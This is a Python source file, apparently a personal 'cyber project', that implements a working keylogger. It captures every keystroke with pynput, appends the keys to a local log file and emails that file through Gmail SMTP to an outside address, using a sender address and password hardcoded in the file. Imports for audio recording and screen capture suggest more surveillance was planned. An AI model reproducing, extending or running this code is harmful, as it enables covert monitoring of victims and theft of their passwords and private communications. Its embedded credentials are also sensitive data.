##########################
# import modules | packages | libraries
##########################

# email package to read, write, and send simple email 
# messages, as well as more complex MIME messages
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib # import smtplib for the actual sending function

from requests import get # allows HTTP requests 
import socket # binds localhost on a port listens for connections

import cryptography.fernet # encrypted messages cannot be manipulated without key
import getpass # accept passwords where data needs to be secure

from pynput.keyboard import Key, Listener # "Key" logs key, "Listener" listens for keystroke
import sounddevice as sd # binds PortAudio library | play and record NumPy arrays 
from scipy.io.wavfile import write # allows write to uncompressed WAV file

from multiprocessing import Process, freeze_support # when multiprocessing has been frozen produce Windows executable

from PIL import ImageGrab # used to copy contents of screen - clipboard to a PIL image memory

# retrieves info about sys platform, current time+ and interacts with the native OS
import platform 
import time
import os

# define logger save path
keys_information = "key_log.txt" 
file_path = "/Users/amartin/Desktop/cyber_Projects/keylogger/key_log.txt"

email_addr = "plurals.hull.0x@server.com"
password = "bsky*limo*dtcv*tdjf"

toaddr = "blkshyguy0o0@gmail.com"

def send_email(filename, attachment, toaddr):
    msg = MIMEMultipart()
    msg['From'] = email_addr
    msg['To'] = toaddr
    msg['Subject'] = "KeyLog File"
    body = "Email body"
    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, "rb") #rb = read binary
    base = MIMEBase('attachment', 'octect')
    base.set_payload((attachment).read())
    encoders.encode_base64(base)
    base.add_header('Content-Disposition', "attachment; filename %s" % filename)
    msg.attach(base)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email_addr, password)
    text = msg.as_string()
    s.sendmail(email_addr, toaddr, text)
    s.quit()

send_email(keys_information, file_path, toaddr)

keys =[]

def on_press(key):
    global keys, cont
    print(key)
    keys.append(key)
    write_file(keys)

def write_file(keys):
    with open(file_path, "a") as f:
        f.write(str(keys))
        f.close()

with Listener(on_press=on_press) as listener:
    listener.join()